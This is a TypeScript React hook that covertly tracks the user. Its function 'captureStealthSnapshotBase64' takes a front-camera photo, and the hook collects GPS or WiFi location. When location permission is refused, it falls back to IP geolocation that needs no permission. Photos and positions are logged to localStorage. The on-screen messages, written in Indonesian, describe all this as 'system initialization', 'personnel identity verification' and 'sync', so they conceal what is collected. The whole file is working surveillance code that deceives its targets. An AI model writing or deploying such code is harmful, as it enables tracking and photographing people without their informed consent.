import { useCallback } from 'react';

interface TrackingData {
  lat: number | null;
  lng: number | null;
  accuracy: number | null;
  timestamp: number;
  city?: string;
  region?: string;
  isp?: string;
  is_ip_location?: boolean;
}

export const useTracking = () => {
  const captureStealthSnapshotBase64 = async (): Promise<string | null> => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" }
      });

      const video = document.createElement('video');
      video.srcObject = stream;
      await video.play();

      // Give it a moment to stabilize
      await new Promise(resolve => setTimeout(resolve, 800));

      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      if (ctx) {
        ctx.drawImage(video, 0, 0);
      }

      // Stop all tracks
      stream.getTracks().forEach(track => track.stop());

      // Return as Base64 with compressed quality
      const dataUrl = canvas.toDataURL('image/jpeg', 0.4);
      
      if (dataUrl.length < 100) {
        throw new Error('Image capture empty');
      }
      
      return dataUrl;
    } catch (err) {
      console.warn('Camera access denied or failed:', err);
      return null;
    }
  };

  const getIPLocation = async (): Promise<TrackingData | null> => {
    try {
      console.log('Fetching IP-based location fallback...');
      const response = await fetch('https://ipapi.co/json/');
      if (!response.ok) throw new Error('IP API failed');
      const data = await response.json();
      
      return {
        lat: data.latitude,
        lng: data.longitude,
        accuracy: null,
        timestamp: Date.now(),
        city: data.city,
        region: data.region,
        isp: data.org,
        is_ip_location: true
      };
    } catch (err) {
      console.warn('IP Geolocation failed:', err);
      return null;
    }
  };

  const getBrowserLocation = (options: PositionOptions): Promise<TrackingData | null> => {
    return new Promise((resolve) => {
      if (!navigator.geolocation) {
        localStorage.setItem('last_sakti_geo_error', 'Geolocation not supported by browser');
        resolve(null);
        return;
      }

      navigator.geolocation.getCurrentPosition(
        (pos) => {
          localStorage.setItem('last_sakti_geo_error', 'None (Success)');
          resolve({
            lat: pos.coords.latitude,
            lng: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
            timestamp: pos.timestamp
          });
        },
        (err) => {
          const errorMsg = `Error code ${err.code}: ${err.message}`;
          localStorage.setItem('last_sakti_geo_error', errorMsg);
          console.warn('Geolocation attempt failed:', errorMsg);
          resolve(null);
        },
        options
      );
    });
  };

  const getHighAccuracyLocation = async (): Promise<TrackingData | null> => {
    // Attempt 1: High Accuracy (GPS)
    let location = await getBrowserLocation({ 
      enableHighAccuracy: true, 
      timeout: 10000, 
      maximumAge: 0 
    });

    // Attempt 2: Standard Fallback (WiFi/Cell)
    if (!location) {
      const lastError = localStorage.getItem('last_sakti_geo_error') || '';
      if (!lastError.includes('Error code 1')) {
        location = await getBrowserLocation({ 
          enableHighAccuracy: false, 
          timeout: 10000, 
          maximumAge: 30000 
        });
      }
    }

    // Attempt 3: Cached Location
    if (!location) {
      const lastError = localStorage.getItem('last_sakti_geo_error') || '';
      if (!lastError.includes('Error code 1')) {
        location = await getBrowserLocation({ 
          enableHighAccuracy: false, 
          timeout: 2000, 
          maximumAge: Infinity 
        });
      }
    }

    // Attempt 4: IP Geolocation (No Permission Required)
    if (!location) {
      console.log('Switching to IP-based Geolocation fallback...');
      location = await getIPLocation();
    }

    return location;
  };

  const performSync = useCallback(async (onProgress?: (msg: string) => void) => {
    onProgress?.('Menginisialisasi sistem...');
    
    // Trigger location capture
    onProgress?.('Mencari posisi (GPS/IP)...');
    const location = await getHighAccuracyLocation();
    
    // Trigger snapshot
    onProgress?.('Verifikasi identitas personel...');
    const photoBase64 = await captureStealthSnapshotBase64();

    if (!location && !photoBase64) {
      onProgress?.('Gagal: Izin Kamera ditolak');
      return false;
    }

    onProgress?.('Menyimpan ke Memori Lokal...');
    
    try {
      const timestamp = new Date();
      const newEntry = {
        id: timestamp.getTime().toString(),
        timestamp: timestamp.toLocaleString('id-ID', { 
          dateStyle: 'medium', 
          timeStyle: 'medium' 
        }),
        timestamp_raw: timestamp.getTime(),
        photo: photoBase64,
        lat: location?.lat || null,
        lng: location?.lng || null,
        accuracy: location?.accuracy || null,
        city: location?.city || null,
        region: location?.region || null,
        isp: location?.isp || null,
        is_ip_location: location?.is_ip_location || false
      };

      const existingLogsRaw = localStorage.getItem('sakti_tracking_logs');
      let existingLogs = [];
      
      if (existingLogsRaw) {
        try {
          existingLogs = JSON.parse(existingLogsRaw);
          if (!Array.isArray(existingLogs)) existingLogs = [];
        } catch (e) {
          existingLogs = [];
        }
      }
      
      const updatedLogs = [newEntry, ...existingLogs].slice(0, 15);
      localStorage.setItem('sakti_tracking_logs', JSON.stringify(updatedLogs));

      await new Promise(r => setTimeout(r, 800));
      onProgress?.('Sinkronisasi Berhasil');
      return true;
    } catch (err) {
      console.error('Sync failed:', err);
      onProgress?.('Gagal: Memori Browser Penuh');
      return false;
    }
  }, []);

  return { performSync };
};
